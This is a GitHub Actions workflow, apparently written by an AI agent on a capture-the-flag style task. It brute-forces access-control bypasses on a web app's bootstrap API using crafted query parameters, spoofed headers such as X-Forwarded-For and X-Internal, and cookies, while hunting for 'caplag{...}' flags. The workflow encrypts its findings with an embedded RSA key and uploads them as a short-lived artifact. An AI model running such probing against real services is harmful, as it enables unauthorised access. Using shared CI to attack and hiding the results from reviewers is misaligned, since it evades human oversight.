name: launchlet-part3-bootstrapdiff
on:
  push:
    branches: [agent/launchlet-part3-bootstrapdiff-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 4
    steps:
      - name: Probe bootstrap differential modes and encrypt anomalies
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,urllib.parse,concurrent.futures,itertools
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out');path='/api/app/bootstrap'
          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0';br=s.get(base+path,timeout=8);baseline=br.text
          tests=[]
          vals=['internal','enterprise','production','release','deploy','deployment','preview','launchlet-demo-board','ws-launchlet-internal','preview-8b11c','8b11c','lrec_preview_demo_2026','2026.05.16-rc3','rc3','admin','ops','private']
          keys=['mode','view','scope','context','preview','project','projectId','workspace','workspaceId','environment','env','stage','target','deployRef','ref','build','receipt','internal','admin']
          for k in keys:
            pub='launchlet-demo-board' if 'project' in k or k in ('context','preview') else ('ws-launchlet-public' if 'workspace' in k else 'preview')
            for v in vals:
              tests.append(('query',urllib.parse.urlencode([(k,v)]),{}))
              tests.append(('dupq',urllib.parse.urlencode([(k,v),(k,pub)]),{}))
              tests.append(('dupqrev',urllib.parse.urlencode([(k,pub),(k,v)]),{}))
          headers=['X-Launchlet-Mode','X-Launchlet-Context','X-Launchlet-Preview','X-Launchlet-Workspace','X-Launchlet-Project','X-Launchlet-Scope','X-Launchlet-Environment','X-Launchlet-Deploy-Ref','X-Launchlet-Receipt','X-Internal','X-Launchlet-Internal','X-Forwarded-For']
          for hn in headers:
            for v in vals:
              tests.append(('header','',{hn:v}))
          cookies=['mode','context','preview','workspace','project','deployRef','receipt','launchlet_mode','launchlet_context','launchlet_preview','launchlet_workspace','launchlet_project','launchlet_deploy_ref']
          for cn in cookies:
            for v in vals:
              tests.append(('cookie','',{'Cookie':cn+'='+v}))
          # bounded de-dup
          uniq=[];seen=set()
          for t in tests:
            sig=(t[0],t[1],tuple(sorted(t[2].items())))
            if sig not in seen:seen.add(sig);uniq.append(t)
          tests=uniq
          def one(t):
            kind,q,h=t
            url=base+path+('?' + q if q else '')
            try:r=requests.get(url,headers=h,timeout=6,allow_redirects=False)
            except Exception:return None
            if r.status_code!=br.status_code or r.text!=baseline:
              return {'kind':kind,'query':q,'sentHeaders':h,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
          hits=[]
          with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
            for x in ex.map(one,tests):
              if x:
                hits.append(x)
                flags=[f for f in re.findall(r'caplag\{[^}]+\}',x.get('body','')) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
                if flags:(out/'FOUND.txt').write_text(json.dumps(x,indent=2));break
          (out/'summary.json').write_text(json.dumps({'tested':len(tests),'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-bootstrapdiff-encrypted
          path: artifact/
          retention-days: 1
